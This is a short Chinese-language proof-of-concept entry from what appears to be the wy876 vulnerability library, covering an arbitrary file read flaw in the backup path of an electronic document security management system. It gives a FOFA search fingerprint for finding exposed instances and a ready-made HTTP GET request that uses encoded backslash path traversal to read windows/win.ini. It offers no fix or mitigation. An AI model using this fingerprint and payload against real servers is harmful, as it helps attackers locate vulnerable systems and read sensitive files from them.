---
fofa: "body="
source: "wy876 漏洞文库"
---

# 电子文档安全管理系统backup存在任意文件读取漏洞

# 一、漏洞简介
电子文档安全管理系统backup存在任意文件读取漏洞，攻击者可通过该漏洞获取敏感信息。

# 二、影响版本
+ 电子文档安全管理系统

# 三、资产测绘
+ fofa`body="docsafe/docsafe.nocache.js"`
+ 特征


# 四、漏洞复现
```plain
GET /resources/backup/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini HTTP/1.1
Host: 
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ef5aearlcpog05ob>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
